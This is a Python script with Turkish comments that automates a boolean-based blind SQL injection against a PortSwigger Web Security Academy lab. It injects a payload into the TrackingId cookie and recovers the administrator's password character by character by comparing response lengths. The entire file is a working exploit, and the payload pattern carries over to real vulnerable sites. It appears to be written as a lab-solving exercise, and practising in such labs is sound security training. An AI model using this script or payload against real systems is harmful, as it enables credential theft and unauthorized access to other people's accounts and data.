import requests
import string
import time

# --- AYARLAR ---
# Bu kısma kendi labınızın url adresini gir
target_url = "https://0a2e007903c33f3580ef3f56002000b3.web-security-academy.net/"

# Tarayıcıdan aldığın GÜNCEL Cookie değerlerini buraya gir.
# 'TrackingId' kısmının SADECE orijinal ID'sini buraya yaz.
tracking_id_base = "ZJPZP13tje9pVph4" 
# bu değer labdaki diğer cookie değeridir kendi lab session cookie değerinizi giriniz.
session_id = "MlmR5LeCSrHkY3SbbKJdWbLbKeLNPs1o"

# Buradaki bilgileri kendi labınıza göre değiştirmelisiniz
# f12 tuşuna bastıktan sonara network sekmesine tıklayıp sayfayı yeniletin
# burada filter?category=..... benzer bir istek olacak oraya tıklayıp aşağıdaki 
# başlıkları bulup oradaki bilgileri buradaki karşılıklarına ekleyin 
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
}

# 1. Liste: 1-20 arası sayılar
positions = range(1, 21)
# 2. Liste: a-z ve 0-9
characters = string.ascii_lowercase + string.digits 

# Sonuçları tutacağımız liste
results = []

print(f"Toplam {len(positions) * len(characters)} istek gönderilecek. Başlıyor...")

# --- DÖNGÜLER ---
for pos in positions:
    for char in characters:
        
        # Senin belirlediğin SQL Payload yapısı
        # $1$ yerine {pos}, $y$ yerine {char} geliyor.
        payload = f"' and (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username = 'administrator') = '{char}'--"
        
        # Cookie'yi oluşturuyoruz
        cookies = {
            "TrackingId": tracking_id_base + payload,
            "session": session_id
        }

        try:
            # İsteği gönder
            response = requests.get(target_url, headers=headers, cookies=cookies)
            
            # Yanıt uzunluğunu al
            length = len(response.content)
            
            # Sonucu listeye ekle
            results.append({
                "pos": pos,
                "char": char,
                "length": length,
                "status": response.status_code
            })
            
            # Ekrana bilgi bas (yan yana yazsın diye end='\r' kullandım)
            print(f"İstek yollandı: Pozisyon {pos} - Karakter {char} - Uzunluk: {length}", end='\r')
            
        except Exception as e:
            print(f"\nHata oluştu: {e}")

print("\n\n--- Tüm İstekler Tamamlandı. Sıralanıyor... ---\n")

# --- SIRALAMA ---
# Yanıt uzunluğuna (length) göre BÜYÜKTEN KÜÇÜĞE (reverse=True) sıralar.
# Farklı olan (doğru olan) genellikle en üstte veya en altta çıkar.
sorted_results = sorted(results, key=lambda x: x['length'], reverse=True)

print(f"{'POZİSYON':<10} {'KARAKTER':<10} {'UZUNLUK':<10} {'STATUS'}")
print("-" * 50)

for res in sorted_results:
    # Tüm sonuçları döküyoruz, en üsttekiler muhtemelen doğru şifre parçalarıdır.
    print(f"{res['pos']:<10} {res['char']:<10} {res['length']:<10} {res['status']}")